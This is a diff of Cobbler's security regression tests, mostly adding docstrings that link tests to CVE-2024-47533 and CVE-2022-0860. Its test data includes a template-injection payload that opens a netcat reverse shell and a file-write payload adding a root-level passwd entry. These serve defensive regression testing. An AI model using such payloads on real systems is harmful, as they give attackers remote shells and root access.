@@ -16,9 +16,10 @@ from cobbler.modules.authentication import pam
 from cobbler.utils import get_shared_secret
 
 try:
+    # pylint: disable-next=deprecated-module
     import crypt
 except ModuleNotFoundError:
-    import legacycrypt as crypt
+    import legacycrypt as crypt  # type: ignore
 
 # ==================== Start tnpconsultants ====================
 
@@ -27,6 +28,10 @@ except ModuleNotFoundError:
 
 @pytest.fixture(name="try_connect")
 def fixture_try_connect() -> Callable[[str], xmlrpc.client.ServerProxy]:
+    """
+    Fixture to provide an XML-RPC Client object to all tests of GHSA-m26c-fcgh-cp6h/CVE-2024-47533.
+    """
+
     def try_connect(url: str) -> xmlrpc.client.ServerProxy:
         xmlrpc_server = xmlrpc.client.ServerProxy(url)
         return xmlrpc_server
@@ -41,6 +46,9 @@ def setup_profile(
     fk_kernel: str,
     fk_initrd: str,
 ):
+    """
+    Fixture to provide a distro and profile to all tests of GHSA-m26c-fcgh-cp6h/CVE-2024-47533.
+    """
     cobbler_api = try_connect("http://localhost/cobbler_api")
     shared_secret = get_shared_secret()
     token = cobbler_api.login("", shared_secret)
@@ -57,18 +65,17 @@ def setup_profile(
     # Create a test Profile
     profile = cobbler_api.new_profile(token)
     cobbler_api.modify_profile(profile, "name", "security_test_profile", token)
-    cobbler_api.modify_profile(profile, "distro", "security_test_distro", token)
+    cobbler_api.modify_profile(profile, "distro", distro, token)
     cobbler_api.save_profile(profile, token)
-
-    yield
-
-    cobbler_api.remove_profile("security_test_profile", token)
-    cobbler_api.remove_distro("security_test_distro", token)
+    return
 
 
 def test_arbitrary_file_disclosure_1(
     setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
 ):
+    """
+    Test to verify that the arbitrary file read of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
+    """
     # Arrange
     cobbler_api = try_connect("http://localhost/cobbler_api")
 
@@ -89,6 +96,9 @@ def test_arbitrary_file_disclosure_1(
 def test_template_injection_1(
     setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
 ):
+    """
+    Test to verify that the arbitrary template injections of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
+    """
     # Arrange
     exploitcode = "__import__('os').system('nc [tnpitsecurity] 4242 -e /bin/sh')"
     cobbler_api = try_connect("http://localhost/cobbler_api")
@@ -118,6 +128,9 @@ def test_template_injection_1(
 def test_arbitrary_file_write_1(
     setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
 ):
+    """
+    Test to verify that the arbitrary file write of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
+    """
     # Arrange
     cobbler_api = try_connect("http://localhost/cobbler_api")
     exploit = b"cha:!:0:0:cha:/:/bin/bash\n"
@@ -143,14 +156,19 @@ def test_arbitrary_file_write_1(
 
 
 def test_pam_login_with_expired_user():
+    """
+    Test to verify that GHSA-mcg6-h362-cmq5/CVE-2022-0860 stays fixed.
+    """
     # Arrange
     test_api = CobblerAPI()
     test_username = "expired_user"
     test_password = "password"
     # create pam testuser
-    subprocess.run(["useradd", "-p", crypt.crypt(test_password), test_username])
+    subprocess.run(
+        ["useradd", "-p", crypt.crypt(test_password), test_username], check=False  # type: ignore
+    )
     # change user to be expired
-    subprocess.run(["chage", "-E0", test_username])
+    subprocess.run(["chage", "-E0", test_username], check=False)
 
     # Act - Try login
     result = pam.authenticate(test_api, test_username, test_password)
